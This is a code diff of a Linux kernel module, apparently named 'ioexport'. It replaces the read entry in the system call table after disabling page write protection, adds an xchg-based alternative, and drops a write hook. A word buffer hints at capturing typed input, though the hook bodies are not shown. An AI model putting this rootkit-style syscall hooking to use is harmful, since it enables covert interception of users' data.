@@ -18,7 +18,7 @@
 unsigned long **sys_call_table;
 
 
-asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
+//asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);
 asmlinkage long (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
 //int ioexport(unsigned int fd, char __user *buf, size_t count);
 int ioexport(unsigned int fd, const char __user *buf, size_t count); 
@@ -129,7 +129,7 @@ int ioexport(unsigned int fd, const char __user *buf, size_t count) {
 	
 	return 1;
 } 
-*/
+
 
 
 asmlinkage long new_sys_write(unsigned int fd, const char __user *buf, size_t count)
@@ -138,6 +138,7 @@ asmlinkage long new_sys_write(unsigned int fd, const char __user *buf, size_t co
 
 	return ref_sys_write(fd, buf, count);
 }
+*/
 
 static char word_buf[64]; 
 static int word_len = 0;
@@ -297,17 +298,21 @@ static int __init ioexport_start(void)
 	strcpy(proc_io->data, "first file private data");
 	*/
 
+#ifdef XCHG
+	ref_sys_read = xchg(&sys_call_table[__NR_read], new_sys_read); 
+#else
 	DISABLE_PAGE_PROTECTION;
 	//disable_page_protection();
-	ref_sys_write = (void *)sys_call_table[__NR_write];
+	//ref_sys_write = (void *)sys_call_table[__NR_write];
 	ref_sys_read = (void *)sys_call_table[__NR_read];
 	sys_call_table[__NR_read] = (unsigned long *)new_sys_read;
-	sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
+	//sys_call_table[__NR_write] = (unsigned long *)new_sys_write;
 
 	
 
 	ENABLE_PAGE_PROTECTION;
 	//enable_page_protection();
+#endif
 
 	//queue_init();
 
@@ -329,10 +334,14 @@ static void __exit ioexport_end(void)
 		return;
 	} 
 
+#ifdef XCHG
+	(void *) xchg(&sys_call_table[__NR_read], ref_sys_read); 
+#else
 	DISABLE_PAGE_PROTECTION;
 	sys_call_table[__NR_read] = (unsigned long *)ref_sys_read;
-	sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
+	//sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;
 	ENABLE_PAGE_PROTECTION;
+#endif
 }
 
 module_init(ioexport_start);
